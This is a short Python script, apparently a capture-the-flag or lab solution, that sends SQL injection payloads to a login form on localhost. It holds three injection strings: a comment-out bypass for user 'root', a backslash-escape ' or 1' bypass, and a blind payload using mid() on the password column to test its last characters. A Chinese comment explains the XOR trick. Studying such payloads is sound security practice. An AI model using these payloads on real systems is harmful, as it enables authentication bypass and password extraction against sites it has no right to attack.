#!/usr/bin python

import requests

url = "http://localhost:8888"
data = {"user": "root';#", "passwd": "a"}
data = {"user": "\\", "passwd": " or 1;#"}
data = {"user": "root'^!(mid((passwd)from(-2))='et');#", "passwd": " "} # root 的 't' 為 0x74, 因此 't'^0 == 't', 由於 mid(...)='et' => 1, 所以要加 !, mid(...) => passwd[-2:]
                                                                        # mid == substr


r = requests.post(url, data)

print(r.text)
